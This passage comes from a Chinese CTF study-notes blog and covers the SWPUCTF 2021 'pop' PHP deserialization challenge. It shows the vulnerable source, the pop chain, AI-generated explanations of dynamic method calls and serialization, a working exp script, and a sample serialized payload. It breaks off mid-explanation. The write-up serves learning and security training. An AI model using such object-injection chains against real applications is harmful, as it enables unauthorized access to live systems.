-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2025/02/22/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar_2.gif">
-      <meta itemprop="name" content="温柔刀">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CTF学习笔记">
-      <meta itemprop="description" content="JNU_WEB">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | CTF学习笔记">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/2025/02/22/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop/" class="post-title-link" itemprop="url">[SWPUCTF 2021 新生赛]pop</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2025-02-22 20:54:49 / 修改时间：22:42:38" itemprop="dateCreated datePublished" datetime="2025-02-22T20:54:49+08:00">2025-02-22</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
-        </span>
-    </span>
-
-  
-  
-  <span class="post-meta-item">
-    
-    <span class="post-meta-item-icon">
-      <i class="far fa-comment"></i>
-    </span>
-    <span class="post-meta-item-text">Waline：</span>
-  
-    <a title="waline" href="/2025/02/22/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop/#waline" itemprop="discussionUrl">
-      <span class="post-comments-count waline-comment-count" data-path="/2025/02/22/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop/" itemprop="commentCount"></span>
-    </a>
-  </span>
-  
-  
-    <span class="post-meta-break"></span>
-    <span class="post-meta-item" title="本文字数">
-      <span class="post-meta-item-icon">
-        <i class="far fa-file-word"></i>
-      </span>
-      <span class="post-meta-item-text">本文字数：</span>
-      <span>3.5k</span>
-    </span>
-    <span class="post-meta-item" title="阅读时长">
-      <span class="post-meta-item-icon">
-        <i class="far fa-clock"></i>
-      </span>
-      <span class="post-meta-item-text">阅读时长 &asymp;</span>
-      <span>13 分钟</span>
-    </span>
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p>源码：删了点</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;123456&#x27;</span>;  <span class="comment"># 属性有点问题，需要url编码</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;admin === <span class="string">&#x27;w44m&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;passwd ===<span class="string">&#x27;08067&#x27;</span>)&#123;  <span class="comment"># 1最终目的是改admin 和passwd的值</span></span><br><span class="line">            <span class="keyword">include</span>(<span class="string">&#x27;flag.ph                     p&#x27;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;w00m;  <span class="comment"># 4看到了echo，说明可以出发 __toString</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;  <span class="comment"># public $w22m;和public $w22m; 是暗示吗？</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;w00m-&gt;&#123;<span class="variable language_">$this</span>-&gt;w22m&#125;();  <span class="comment"># 动态调用</span></span><br><span class="line">        <span class="comment"># 分步解释：$this-&gt;w00m表示当前对象（w33m 类实例）的 w00m 属性。假设 w00m 是另一个对象的实例（例如 w44m 类的对象）。&#123;$this-&gt;w22m&#125;表示取当前对象（w33m 类实例）的 w22m 属性的值，作为方法名。如果 w22m 的值是字符串 &quot;Getflag&quot;，则等价于调用 $this-&gt;w00m-&gt;Getflag()。()表示执行这个方法。最终代码的作用是：动态调用 $this-&gt;w00m 对象的某个方法，方法名由 $this-&gt;w22m 的值决定。</span></span><br><span class="line"><span class="comment"># 。&#123;$this-&gt;w22m&#125;表示取当前对象（w33m 类实例）的 w22m 属性的值 为什么？为什么为什么？</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$w00m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;w00m&#x27;</span>];    <span class="comment"># 2可以看到我们这边传入的是$w00m的值</span></span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$w00m</span>);  <span class="comment"># 3unserialize能触发__destruct</span></span><br></pre></td></tr></table></figure>
-
-<p>链子如下：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># w22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()</span><br></pre></td></tr></table></figure>
-
-<p>这里写法是拿的NSS一位师傅的，我觉得写的真的很好</p>
-<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/note/set/339">https://www.nssctf.cn/note/set/339</a></p>
-<p>我会在这里留下我一开始写出来的答案，真是不可思议</p>
-<img src="/2025/02/22/SWPUCTF-2021-%E6%96%B0%E7%94%9F%E8%B5%9B-pop/DC5E3670C98CC0281001031965574E41.png" class="" title="DC5E3670C98CC0281001031965574E41">
-
-<p>这里有一个很关键的点没理解，就是我们怎么触发魔术方法？</p>
-<p>自己敲的白话版：</p>
-<blockquote>
-<p>比如说<br>class A<br>…<br>echo $1<br>class B<br>function __tostring</p>
-<p>那么<br>$a &#x3D; new A<br>$b &#x3D; new B<br>$a -&gt;1&#x3D;$b<br>这里属性的值是个类，类里面有个魔术方法，外面的代码实现了类里面的魔术方法，就触发了</p>
-</blockquote>
-<p>后面我又提问了DS：</p>
-<p>我还是不理解<br>$this-&gt;w00m-&gt;{$this-&gt;w22m}();<br>为什么设 w00m 是另一个对象的实例（例如 w44m 类的对象）。{$this-&gt;w22m}表示取当前对象（w33m 类实例）的 w22m 属性的值，作为方法名。<br>1.为什么 w00m 是另一个对象的实例，w22m是当前对象的值<br>2.如果 w22m 的值是字符串 “Getflag”，则等价于调用 $this-&gt;w00m-&gt;Getflag()。()表示执行这个方法。那么Getflag()不是class w44m定义的函数吗？为什么能触发呢？<br>3.动态调用 $this-&gt;w00m 对象的某个方法，方法名由 $this-&gt;w22m 的值决定。所以是我动态调用不理解吗？</p>
-<p>Answer（来自DS）:</p>
-<h3 id="逐步解释：动态方法调用的核心逻辑"><a href="#逐步解释：动态方法调用的核心逻辑" class="headerlink" title="逐步解释：动态方法调用的核心逻辑"></a>逐步解释：动态方法调用的核心逻辑</h3><hr>
-<h4 id="1-为什么-w00m-必须是另一个对象的实例？"><a href="#1-为什么-w00m-必须是另一个对象的实例？" class="headerlink" title="1. 为什么 w00m 必须是另一个对象的实例？"></a><strong>1. 为什么 <code>w00m</code> 必须是另一个对象的实例？</strong></h4><ul>
-<li><p><strong>对象间的协作</strong>：在面向对象编程中，一个对象可以通过属性持有另一个对象的引用，从而调用其方法或访问其属性。这类似于现实世界中“遥控器操作电视”的关系：</p>
-<ul>
-<li><strong><code>w00m</code></strong>：相当于“遥控器”（控制目标对象）。</li>
-<li><strong><code>w44m</code> 对象</strong>：相当于“电视”（实际执行操作的目标）。</li>
-</ul>
-</li>
-<li><p><strong>代码示例</strong>：</p>
-<p>php</p>
-<p>复制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class TV &#123;</span><br><span class="line">    public function turnOn() &#123;</span><br><span class="line">        echo &quot;电视已打开&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class Remote &#123;</span><br><span class="line">    public $device; // 指向 TV 对象</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$tv = new TV();</span><br><span class="line">$remote = new Remote();</span><br><span class="line">$remote-&gt;device = $tv; // 遥控器关联到电视</span><br><span class="line"></span><br><span class="line">// 通过遥控器调用电视的方法</span><br><span class="line">$remote-&gt;device-&gt;turnOn(); // 输出 &quot;电视已打开&quot;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>这里 <code>$remote-&gt;device</code> 必须是一个 <code>TV</code> 对象实例，才能调用 <code>turnOn()</code> 方法。</li>
-</ul>
-</li>
-<li><p><strong>回到你的代码</strong>：</p>
-<p>php</p>
-<p>复制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;();</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>$this-&gt;w00m</code> 必须是一个对象实例（如 <code>w44m</code>），才能调用它的方法。</li>
-<li><code>$this-&gt;w22m</code> 是方法名的字符串（如 <code>&quot;Getflag&quot;</code>），决定调用哪个方法。</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h4 id="2-为什么能调用-w44m-的-Getflag-？"><a href="#2-为什么能调用-w44m-的-Getflag-？" class="headerlink" title="2. 为什么能调用 w44m 的 Getflag()？"></a><strong>2. 为什么能调用 <code>w44m</code> 的 <code>Getflag()</code>？</strong></h4><ul>
-<li><p><strong>关键逻辑</strong>：PHP 允许通过字符串动态调用对象的方法。如果 <code>w00m</code> 是 <code>w44m</code> 的实例，且 <code>w22m</code> 的值是 <code>&quot;Getflag&quot;</code>，则代码等价于：</p>
-<p>php</p>
-<p>复制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;w00m-&gt;Getflag();</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>前提条件</strong>：<code>w44m</code> 类必须定义 <code>Getflag()</code> 方法，否则会报错。</li>
-</ul>
-</li>
-<li><p><strong>代码验证</strong>：</p>
-<p>php</p>
-<p>复制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class w44m &#123;</span><br><span class="line">    public function Getflag() &#123;</span><br><span class="line">        echo &quot;Flag is captured!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m &#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$obj = new w33m();</span><br><span class="line">$obj-&gt;w00m = new w44m(); // w00m 是 w44m 的实例</span><br><span class="line">$obj-&gt;w22m = &quot;Getflag&quot;;   // 方法名为 Getflag</span><br><span class="line"></span><br><span class="line">// 动态调用</span><br><span class="line">$obj-&gt;w00m-&gt;&#123;$obj-&gt;w22m&#125;(); // 输出 &quot;Flag is captured!&quot;</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>你的场景</strong>：</p>
-<ul>
-<li><code>w33m</code> 的 <code>w00m</code> 属性指向 <code>w44m</code> 的实例。</li>
-<li><code>w22m</code> 的值为 <code>&quot;Getflag&quot;</code>，因此 <code>$this-&gt;w00m-&gt;Getflag()</code> 被调用。</li>
-<li>如果 <code>w44m::Getflag()</code> 满足条件（<code>admin</code> 和 <code>passwd</code> 正确），则输出 flag。</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h4 id="3-动态调用的本质是什么？"><a href="#3-动态调用的本质是什么？" class="headerlink" title="3. 动态调用的本质是什么？"></a><strong>3. 动态调用的本质是什么？</strong></h4><ul>
-<li><p><strong>动态方法调用</strong>：通过变量值决定调用哪个方法，而不是直接写死方法名。这种机制类似于“根据用户输入选择功能”。</p>
-<ul>
-<li><p><strong>静态调用</strong>（方法名固定）：</p>
-<p>php</p>
-<p>复制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$obj-&gt;fixedMethodName();</span><br></pre></td></tr></table></figure>
-</li>
-<li><p><strong>动态调用</strong>（方法名由变量决定）：</p>
-<p>php</p>
-<p>复制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$methodName = &quot;dynamicMethod&quot;;</span><br><span class="line">$obj-&gt;&#123;$methodName&#125;();</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-<li><p><strong>实际应用场景</strong>：</p>
-<ul>
-<li>插件系统：根据配置加载不同插件的方法。</li>
-<li>路由分发：根据 URL 参数调用对应的控制器方法。</li>
-<li><strong>反序列化漏洞利用</strong>：通过篡改序列化数据，控制动态调用的目标方法。</li>
-</ul>
-</li>
-<li><p><strong>漏洞利用中的动态调用</strong>：</p>
-<ul>
-<li>攻击者可以控制 <code>w22m</code> 的值（如通过反序列化输入），从而调用任意方法。</li>
-<li>在你的代码中，攻击者目标是让 <code>w22m</code> 的值为 <code>&quot;Getflag&quot;</code>，从而触发 <code>w44m::Getflag()</code>。</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h3 id="完整流程总结"><a href="#完整流程总结" class="headerlink" title="完整流程总结"></a><strong>完整流程总结</strong></h3><ol>
-<li><strong>反序列化触发入口</strong>：<ul>
-<li>反序列化 <code>w22m</code> 对象 <code>$a</code>，触发其 <code>__destruct()</code> 方法。</li>
-<li><code>__destruct()</code> 中执行 <code>echo $this-&gt;w00m</code>（即 <code>echo $b</code>）。</li>
-</ul>
-</li>
-<li><strong>触发 <code>__toString()</code></strong>：<ul>
-<li>因为 <code>$b</code> 是 <code>w33m</code> 对象，PHP 自动调用 <code>w33m::__toString()</code>。</li>
-</ul>
-</li>
-<li><strong>动态方法调用</strong>：<ul>
-<li>在 <code>__toString()</code> 中执行 <code>$this-&gt;w00m-&gt;&#123;$this-&gt;w22m&#125;()</code>。</li>
-<li><code>$this-&gt;w00m</code> 是 <code>w44m</code> 对象 <code>$c</code>，<code>$this-&gt;w22m</code> 是 <code>&quot;Getflag&quot;</code>。</li>
-<li>等价于调用 <code>$c-&gt;Getflag()</code>。</li>
-</ul>
-</li>
-<li><strong>执行目标方法</strong>：<ul>
-<li>若 <code>w44m</code> 的 <code>admin</code> 和 <code>passwd</code> 属性被篡改，<code>Getflag()</code> 输出 flag。</li>
-</ul>
-</li>
-</ol>
-<hr>
-<h3 id="类比理解"><a href="#类比理解" class="headerlink" title="类比理解"></a><strong>类比理解</strong></h3><ul>
-<li><strong>遥控器与电视</strong>：<ul>
-<li><code>w22m</code> 是遥控器的“按钮名称”（如“开机”）。</li>
-<li><code>w33m</code> 是遥控器本身，它知道要操作哪个设备（<code>w00m</code> 属性指向电视）。</li>
-<li>按下“开机”按钮（<code>w22m = &quot;Getflag&quot;</code>），遥控器向电视发送开机指令（调用 <code>w44m::Getflag()</code>）。</li>
-</ul>
-</li>
-<li><strong>动态调用就像“编程式遥控”</strong>：<ul>
-<li>你可以通过代码动态决定按下哪个按钮（方法名），而不需要提前硬编码。</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h3 id="最终回答你的问题"><a href="#最终回答你的问题" class="headerlink" title="最终回答你的问题"></a><strong>最终回答你的问题</strong></h3><ol>
-<li><strong>为什么 <code>w00m</code> 必须是另一个对象的实例？</strong><br>因为你要调用该对象的方法，就像必须有一个电视才能用遥控器操作它。</li>
-<li><strong>为什么能调用 <code>w44m</code> 的 <code>Getflag()</code>？</strong><br>因为 <code>w00m</code> 指向 <code>w44m</code> 的实例，且 <code>w22m</code> 的值是 <code>&quot;Getflag&quot;</code>，动态调用等价于 <code>$w44m-&gt;Getflag()</code>。</li>
-<li><strong>动态调用的本质</strong>：<br>通过变量动态决定方法名，而不是直接写死。这是 PHP 的灵活性特性，但也可能被滥用（如反序列化漏洞）。</li>
-</ol>
-<h1 id="史莱姆学说"><a href="#史莱姆学说" class="headerlink" title="史莱姆学说"></a>史莱姆学说</h1><p>类就是史莱姆的种类</p>
-<p>一只遥控器史莱姆吃掉了一只电视史莱姆</p>
-<p>所以遥控器调用电视</p>
-<p>（好像回到了物理补习班上…</p>
-<p>btw 实例 就是new的类我脑子真的翻译不过来</p>
-<h1 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w44m</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$admin</span> = <span class="string">&#x27;w44m&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$passwd</span> = <span class="string">&#x27;08067&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Getflag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w22m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">w33m</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w00m</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$w22m</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># w22m.__destruct().w00m-&gt;w33m.__toString().w00m-&gt;w44m.Getflag()</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> w22m;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> w33m;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> w44m;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 入口</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> -&gt;w00m=<span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt;w00m=<span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span> -&gt;w22m=<span class="string">&#x27;Getflag&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>
-
-
-
-<p>由于我是个笨蛋所以我又提问了，其实这种工作应该一开始就做的吧 算了。关关难过关关过</p>
-<blockquote>
-<p>我还有一个问题， $a &#x3D; new w22m; $b &#x3D; new w33m; $c &#x3D; new w44m; # 入口 $a -&gt;w00m&#x3D;$b; $b -&gt;w00m&#x3D;$c; $b -&gt;w22m&#x3D;’Getflag’; 这里不是对$a,b,c都进行修改吗，为什么只有$a被序列化了，难道序列化后的值是$a$b$c的套娃吗</p>
-</blockquote>
-<h3 id="详细解答："><a href="#详细解答：" class="headerlink" title="详细解答："></a>详细解答：</h3><p>你的理解是正确的！在 PHP 中，<strong>序列化一个对象时，它的所有属性（包括其他对象）会被递归序列化</strong>，形成一种“套娃”结构。即使你只显式序列化 <code>$a</code>，它的属性 <code>w00m</code> 指向 <code>$b</code>，而 <code>$b</code> 的属性 <code>w00m</code> 又指向 <code>$c</code>，因此 <strong>序列化后的字符串会包含 <code>$a</code>、<code>$b</code>、<code>$c</code> 三个对象的完整嵌套关系</strong>。</p>
-<hr>
-<h3 id="分步验证：序列化后的结构"><a href="#分步验证：序列化后的结构" class="headerlink" title="分步验证：序列化后的结构"></a>分步验证：序列化后的结构</h3><h4 id="1-对象关系"><a href="#1-对象关系" class="headerlink" title="1. 对象关系"></a>1. <strong>对象关系</strong></h4><p>php</p>
-<p>复制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$a = new w22m();</span><br><span class="line">$b = new w33m();</span><br><span class="line">$c = new w44m();</span><br><span class="line"></span><br><span class="line">$a-&gt;w00m = $b;   // $a 包含 $b</span><br><span class="line">$b-&gt;w00m = $c;   // $b 包含 $c</span><br><span class="line">$b-&gt;w22m = &#x27;Getflag&#x27;;</span><br></pre></td></tr></table></figure>
-
-<h4 id="2-序列化-a"><a href="#2-序列化-a" class="headerlink" title="2. 序列化 $a"></a>2. <strong>序列化 <code>$a</code></strong></h4><p>当你调用 <code>serialize($a)</code> 时，PHP 会递归序列化整个对象链：</p>
-<ul>
-<li>序列化 <code>$a</code>（<code>w22m</code> 对象）<ul>
-<li>序列化 <code>$a-&gt;w00m</code>（即 <code>$b</code>，<code>w33m</code> 对象）<ul>
-<li>序列化 <code>$b-&gt;w00m</code>（即 <code>$c</code>，<code>w44m</code> 对象）</li>
-<li>序列化 <code>$b-&gt;w22m</code>（字符串 <code>&quot;Getflag&quot;</code>）</li>
-</ul>
-</li>
-<li>序列化 <code>$a</code> 的其他属性（如果有）</li>
-</ul>
-</li>
-</ul>
-<p>最终生成的序列化字符串会包含 <strong>完整的对象链</strong>：<code>$a → $b → $c</code>。</p>
-<hr>
-<h3 id="示例序列化结果"><a href="#示例序列化结果" class="headerlink" title="示例序列化结果"></a>示例序列化结果</h3><p>假设三个类的定义如下：</p>
-<p>php</p>
-<p>复制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">class w22m &#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w33m &#123;</span><br><span class="line">    public $w00m;</span><br><span class="line">    public $w22m;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class w44m &#123;</span><br><span class="line">    private $admin = &#x27;aaa&#x27;;</span><br><span class="line">    protected $passwd = &#x27;123456&#x27;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>执行 <code>echo serialize($a)</code> 的输出类似：</p>
-<p>复制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;w22m&quot;:1:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;s:11:&quot;%00w44m%00admin&quot;;s:3:&quot;aaa&quot;;s:8:&quot;%00*%00passwd&quot;;s:6:&quot;123456&quot;;&#125;s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<h4 id="结构解析："><a href="#结构解析：" class="headerlink" title="结构解析："></a>结构解析：</h4><ul>
-<li><strong><code>O:4:&quot;w22m&quot;:1:&#123;...&#125;</code></strong>：<code>$a</code>（<code>w22m</code> 对象），有一个属性 <code>w00m</code>。<ul>
-<li><strong><code>s:4:&quot;w00m&quot;;O:4:&quot;w33m&quot;:2:&#123;...&#125;</code></strong>：<code>$a-&gt;w00m</code> 是 <code>$b</code>（<code>w33m</code> 对象），有两个属性 <code>w00m</code> 和 <code>w22m</code>。<ul>
-<li><strong><code>s:4:&quot;w00m&quot;;O:4:&quot;w44m&quot;:2:&#123;...&#125;</code></strong>：<code>$b-&gt;w00m</code> 是 <code>$c</code>（<code>w44m</code> 对象），包含私有和保护属性。</li>
-<li><strong><code>s:4:&quot;w22m&quot;;s:7:&quot;Getflag&quot;</code></strong>：<code>$b-&gt;w22m</code> 是字符串 <code>&quot;Getflag&quot;</code>。</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<hr>
-<h3 id="关键问题解答"><a href="#关键问题解答" class="headerlink" title="关键问题解答"></a>关键问题解答</h3><h4 id="1-为什么序列化-a-会包含-b-和-c？"><a href="#1-为什么序列化-a-会包含-b-和-c？" class="headerlink" title="1. 为什么序列化 $a 会包含 $b 和 $c？"></a>1. <strong>为什么序列化 <code>$a</code> 会包含 <code>$b</code> 和 <code>$c</code>？</strong></h4><ul>
-<li>PHP 的 <code>serialize()</code> 函数是递归的。当你序列化一个对象时，它会深度遍历所有属性。如果属性是对象，也会被序列化。</li>
-<li>这类似于“树状结构”的遍历：根节点是 <code>$a</code>，子节点是 <code>$b</code>，孙子节点是 <code>$c</code>。</li>
-</ul>
-<h4 id="2-反序列化时会发生什么？"><a href="#2-反序列化时会发生什么？" class="headerlink" title="2. 反序列化时会发生什么？"></a>2. <strong>反序列化时会发生什么？</strong></h4><ul>
-<li><p>当你反序列化字符串时（例如通过 <code>unserialize($_GET[&#39;w00m&#39;])</code>），PHP 会重建整个对象链：<code>$a</code>、<code>$b</code>、<code>$c</code> 都会被还原。</p>
-</li>
-<li><p>对象之间的引用关系完全恢复，因此可以触发之前设计的攻击链：</p>
-<p>复制</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反序列化 $a → 触发 $a 的 __destruct() → 访问 $a-&gt;w00m（即 $b）→ 触发 $b 的 __toString() → 调用 $c-&gt;Getflag()</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h4 id="3-为何代码中只显式序列化-a？"><a href="#3-为何代码中只显式序列化-a？" class="headerlink" title="3. 为何代码中只显式序列化 $a？"></a>3. <strong>为何代码中只显式序列化 <code>$a</code>？</strong></h4><ul>
